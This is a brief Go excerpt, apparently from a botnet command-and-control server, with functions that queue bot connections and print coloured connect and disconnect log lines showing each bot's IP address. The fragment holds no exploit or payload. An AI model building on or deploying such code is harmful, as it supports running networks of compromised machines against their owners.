...
func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
	fmt.Printf("\033[1;37m[CNC] \033[0;32mConnected \033[1;37m| IP Address:\033[0;32m %s (%s)\n", c.conn.RemoteAddr(), c.source)
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
	fmt.Printf("\033[1;37m[CNC] \033[0;31mDisconnected \033[1;37m| IP Address:\033[0;32m %s (%s)\n", c.conn.RemoteAddr(), c.source)
}
